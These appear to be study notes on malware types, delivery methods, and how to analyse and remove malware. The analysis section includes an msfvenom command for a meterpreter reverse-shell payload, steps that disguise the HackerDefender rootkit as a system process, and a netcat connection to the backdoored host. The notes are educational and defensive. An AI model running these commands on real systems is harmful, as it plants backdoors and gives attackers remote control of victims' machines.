# Malware Threats

1. What is malware
2. Malware delivery
3. Analyze and classify malware

## 1. Malware

* Virus
* Worm
* Trojan
* Hybrid
* Ransomware
* Fileless
* Adware
* Spyware

### Virus

* Host
* User interaction

### Worm

* Self-propagate
* Examples
  * Self-propagate
  * SQL Slammer
  * ILoveYou
  * MS Blaster
  * Stuxnet

### Trojan

* User interaction
* Email or websites
* Fake antivirus/updates pop ups

### Hybrid

Combine different types into a hybrid type.

* Bots

### Ransomware

* Encrypt data
* Examples
  * WannaCry
  * Locky

### Fileless

* Running malware at the memory level instead of file level
* Registry keys
* Scheduled tasks
* APIs
* >50%

### Adware

* Ads
* Browser
* Freeware

### Spyware

* Covert monitoring
* Harvest browsing information
* Stealing Credentials
* Screen capture
* Capture email data

## 2. Malware Delivery

* Malvertising
* Phishing
* Removable devices (usb)
* Insider Threat

### Malvertising

* Drive-by downloads that execute code without user interaction
* Common in news portals

### Phishing

* Attacker uses fraudulent communication (such as emails) to lure victim into running malicious software or providing confidential information.
* Message is made to look as though it comes from a trusted sender.

## 3. Analyze and Classify

### Static analysis with Kali Linux

Suppose you are given samples from email attachments.

1. Emulate the malicious file.

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse-tcp LHOST=192.168.0.100 LPORT=433 -f exe -o maliciousfile.exe
```

2. Using _Binwalk_ we will performed an automated analysis by _scanning for common signatures_.

```
binwalk -B maliciousfile.exe    // static analysis
binwalk -3 maliciousfile.exe    // 3D analysis
binwalk -A maliciousfile.exe    // Find commonly used No Operation Opcodes (NOP) used in exploits to land shellcode.
```

3. Using _Exiftool_ we can produce similar information.

```
exiftool maliciousfile.exe
```

4. Hash file with _MD5Deep_ and add this to your analysis report for future references.

```
md5deep maliciousfile.exe
```

### RootKit discovering with Windows

We can use the _Rootkit Revealer Tool_.

1. Place a rootkit, you can use a simple rootkit such as _HackerDefender_ from _carnal0wnage_, let's run `cmd` and the following commands.

```
tasklist                    // list processes & choose a process to mimic, we will use some similar name
netstat -an                 // find currently open ports, pick one next to the legitimate ones already open
cd "C:\Windows\System32"    // change directory to the rootkit, so it looks like a legitimate system file
rename <rootkey EXE> <fake_process_name>.exe
rename <rootkey INI> <fake_process_name>.ini
```

2. Make sure rootkey is properly configured (`.ini` file) with fake process name, ports and settings and load initializatio nfile into memory.

```
<fake_process_name>.ini -:refresh
```

3. Run rootkit

```
./<fake_process_name>.exe
```

4. Now lunch _Rootkit Revealer_ and scan. You should discover your rootkit if using well known files such as _HackerDefender_ example.

#### Rootkit exploitation example

If you were happen to use _HackerDefender_ rootkit, you would be able to connect with _Netcat_ to victim.

```
netcat <target_ip> <open_port>
hostname // verify connection
```

#### Remediation

1. Find suspicious processes with _Rootkit Revealer_ and `cmd` -> `tasklist`.
2. Stop suspicious process with `taskkill /F /pid <PID#>`.
3. Confirm suspicious service in `services.msc`.
4. Delete suspicious service `sc delete <service name>`.
5. Using registry information from _Rootkit Revelear_, find those keys in `regedit` and delete everything you can.
6. Verify RootKit removal running scans again.
